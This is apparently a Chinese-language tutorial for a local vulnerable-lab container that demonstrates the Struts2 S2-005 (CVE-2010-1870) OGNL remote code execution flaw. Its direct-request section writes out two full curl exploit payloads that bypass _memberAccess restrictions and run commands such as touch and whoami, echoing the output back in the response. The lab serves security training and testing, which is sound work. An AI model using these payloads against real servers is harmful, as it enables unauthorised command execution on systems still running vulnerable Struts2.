# struts2-s2-005 操作教程

- 类型：单体靶场
- 目录：`struts2-s2-005`
- 端口：`9963`
- 推荐入口：`/index.action`

## 这是什么

Struts2 `S2-005 / CVE-2010-1870` 演示靶场，核心是利用恶意参数名继续绕过 S2-003 的修复逻辑，修改 `#context` 与 `#_memberAccess` 后执行任意系统命令。当前页面和首页 PoC 都改成了更接近公开利用样本的 canonical payload。

这个模块建议运行在 Tomcat 7 上。实际排查中，Tomcat 8 对部分历史 payload 的处理更严格，可能导致演示链条不稳定。

## 启动前准备

1. 在仓库根目录执行 `bash run-local-build.sh`。
2. 等待对应容器启动完成，并确认端口 `9963` 已经监听。
3. 如果你还想通过首页统一发包，再额外确认 `http://宿主机IP:5000/` 能打开。

## 方式一：通过页面点击测试

1. 打开 `http://宿主机IP:9963/index.action`。
2. 先点 `touch 标记`，观察页面状态里是否出现 `/tmp/struts2-s2-005-success`。
3. 再点 `执行 ifconfig`、`执行 id` 或 `执行 whoami`，观察命令输出是否直接回显在响应里。
4. 如需清理，点击 `清理输出`。

## 方式二：通过首页测试

1. 打开 `http://宿主机IP:5000/`。
2. 在搜索框输入 `struts2_s2_005、s2-005、struts2` 过滤到当前项目。
3. 推荐先跑 `struts2_s2_005_attack_touch`，再跑 `struts2_s2_005_attack_whoami`。
4. 最后用 `struts2_s2_005_normal` 回到基线页面。

推荐直接使用的首页条目：
- `struts2_s2_005_attack_touch`：执行 `touch /tmp/struts2-s2-005-success`
- `struts2_s2_005_attack_whoami`：执行 `whoami`
- `struts2_s2_005_normal`：基线访问

## 方式三：直接访问接口测试

1. 创建标记文件：

```bash
curl -i "http://宿主机IP:9963/index.action?%28%27%5Cu0023_memberAccess.allowStaticMethodAccess%27%29%28unused%29=true&%28%27%5Cu0023_memberAccess.excludeProperties%5Cu003d%40java.util.Collections%40EMPTY_SET%27%29%28unused%29=1&%28%27%5Cu0023context%5B%5C%27xwork.MethodAccessor.denyMethodExecution%5C%27%5D%5Cu003dfalse%27%29%28unused%29=1&%28%27%5Cu0023mycmd%5Cu003d%5C%27touch%20%2Ftmp%2Fstruts2-s2-005-success%5C%27%27%29%28unused%29=1&%28%27%5Cu0023myret%5Cu003d%40java.lang.Runtime%40getRuntime%28%29.exec%28%5Cu0023mycmd%29%27%29%28unused%29=1"
```

2. 执行 `whoami` 并直接回显：

```bash
curl -i "http://宿主机IP:9963/index.action?%28%27%5Cu0023context%5B%5C%27xwork.MethodAccessor.denyMethodExecution%5C%27%5D%5Cu003dfalse%27%29%28bla%29%28bla%29&%28%27%5Cu0023_memberAccess.allowStaticMethodAccess%5Cu003dtrue%27%29%28bla%29%28bla%29&%28%27%5Cu0023_memberAccess.excludeProperties%5Cu003d%40java.util.Collections%40EMPTY_SET%27%29%28kxlzx%29%28kxlzx%29&%28%27%5Cu0023mycmd%5Cu003d%5C%27whoami%5C%27%27%29%28bla%29%28bla%29&%28%27%5Cu0023myret%5Cu003d%40java.lang.Runtime%40getRuntime%28%29.exec%28%5Cu0023mycmd%29%27%29%28bla%29%28bla%29&%28A%29%28%28%27%5Cu0023mydat%5Cu003dnew%5C40java.io.DataInputStream%28%5Cu0023myret.getInputStream%28%29%29%27%29%28bla%29%29&%28B%29%28%28%27%5Cu0023myres%5Cu003dnew%5C40byte%5B51020%5D%27%29%28bla%29%29&%28C%29%28%28%27%5Cu0023mydat.readFully%28%5Cu0023myres%29%27%29%28bla%29%29&%28D%29%28%28%27%5Cu0023mystr%5Cu003dnew%5C40java.lang.String%28%5Cu0023myres%29%27%29%28bla%29%29&%28%27%5Cu0023myout%5Cu003d%40org.apache.struts2.ServletActionContext%40getResponse%28%29%27%29%28bla%29%28bla%29&%28E%29%28%28%27%5Cu0023myout.getWriter%28%29.println%28%5Cu0023mystr%29%27%29%28bla%29%29"
```

3. 基线访问：

```bash
curl -i "http://宿主机IP:9963/index.action"
```

## 测试时重点看什么

1. 页面状态里是否出现标记文件。
2. 命令输出是否能直接回显在响应中。
3. 清理后再次访问，状态是否恢复为空。

## 相关入口

- 总控台：`http://宿主机IP:5000/`
- 文档索引：[`doc/README.md`](../README.md)
- 根项目说明：[`README.md`](../../README.md)
